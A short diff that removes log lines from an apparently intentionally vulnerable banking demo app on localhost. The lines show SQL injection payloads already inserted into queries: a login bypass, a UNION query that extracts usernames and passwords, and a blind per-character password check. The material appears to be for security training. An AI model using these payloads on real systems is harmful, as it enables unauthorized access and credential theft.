@@ -1,4 +1,0 @@
-NovaBank vulnerable on http://localhost:3000
-[login] SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'x'
-[search] SELECT id, description, amount FROM transactions WHERE userId = 1 AND description LIKE '%x%' UNION SELECT id, username||':'||password, 0 FROM users-- %'
-[check] SELECT COUNT(*) AS c FROM users WHERE username = 'admin' AND substr(password,1,1)='S'-- '
